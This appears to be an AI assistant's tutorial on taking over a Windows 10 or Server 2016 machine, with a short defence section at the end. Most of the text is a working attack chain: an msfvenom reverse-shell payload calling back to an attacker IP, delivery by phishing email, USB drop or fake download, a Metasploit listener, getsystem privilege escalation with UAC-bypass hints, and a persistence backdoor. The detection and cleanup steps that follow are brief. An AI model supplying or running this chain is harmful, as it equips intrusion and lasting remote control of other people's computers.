Here’s a demonstration of **how an attacker might gain access to your Windows 10 desktop or Windows Server 2016**, followed by **detection and prevention techniques**.

---

## **Attack Demonstration: Gaining Remote Access**
### **Scenario:** Attacker Gains a Backdoor into Your Windows Machine Using Metasploit (Reverse Shell)

### **Pre-requisites for Lab Simulation**
- A Windows 10 or Windows Server 2016 machine (Target)
- A Kali Linux machine (Attacker)
- Metasploit Framework installed on Kali

---

### **Step 1: Create a Malicious Payload**
The attacker uses **msfvenom** to generate a malicious Windows executable that, when executed on the victim machine, establishes a reverse connection.

On Kali Linux (Attacker):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > malicious.exe
```
> Replace `192.168.1.100` with the attacker's actual IP.

This generates `malicious.exe`, which the attacker needs to get executed on the target.

---

### **Step 2: Deliver the Payload to the Victim**
The attacker **tricks the victim** into executing the file. Some common delivery methods:
- **Phishing Email**: The attacker sends the file disguised as a software update.
- **USB Drop Attack**: The attacker leaves a USB drive with the payload in a public place.
- **Fake Download Link**: The attacker hosts the file on a malicious website.

---

### **Step 3: Set Up a Listener on Kali**
Before the victim runs the file, the attacker sets up a **Metasploit listener** to catch the reverse connection.

```bash
msfconsole
```
Then in Metasploit:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

### **Step 4: Victim Runs the Payload**
Once the victim executes `malicious.exe`, the attacker's machine **gets a remote shell**.

On Kali, the attacker now has a Meterpreter session:
```bash
meterpreter> sysinfo
```
This confirms access to the victim’s system.

---

### **Step 5: Privilege Escalation**
If the attacker needs **admin privileges**, they use:
```bash
meterpreter> getsystem
```
If UAC (User Account Control) prevents privilege escalation, the attacker may run:
```bash
meterpreter> run post/windows/gather/win_privs
```
And then try UAC bypass techniques.

---

### **Step 6: Persistence (Maintaining Access)**
The attacker ensures they **retain access** even after a reboot by installing a backdoor.
```bash
meterpreter> run persistence -U -i 5 -p 4444 -r 192.168.1.100
```
This ensures the payload runs every time the system starts.

---

## **How to Detect & Prevent This Attack**
### **1. Check Running Processes**
If you suspect an attack, open **Task Manager** (Ctrl+Shift+Esc) and look for:
- Unusual processes (`malicious.exe`, `cmd.exe`, `powershell.exe` running unexpectedly)

### **2. Scan for Suspicious Network Connections**
Run:
```powershell
netstat -ano | findstr :4444
```
If you see a foreign IP connected on port 4444, you may have an active attack.

### **3. Check Event Logs**
- **Windows Event Viewer** > **Windows Logs** > **Security**
- Look for **Event ID 4688** (New process creation) with `malicious.exe`
- **Event ID 4624** (Successful login) from an unknown source

### **4. Disable Remote Code Execution**
- Disable **PowerShell execution for all users**:
  ```powershell
  Set-ExecutionPolicy Restricted -Force
  ```
- **Block port 4444** and other unused ports in **Windows Defender Firewall**.

### **5. Remove the Attack**
If you suspect compromise:
- **Kill the malicious process**:
  ```powershell
  taskkill /F /IM malicious.exe
  ```
- **Remove persistence entries**:
  ```powershell
  reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousEntry /f
  ```
- **Run an antivirus scan** with **Windows Defender** or **Malwarebytes**.

## **Conclusion**
This demo shows how an attacker can **gain remote access** to a Windows 10 or Server 2016 machine using **Metasploit and a reverse shell**.
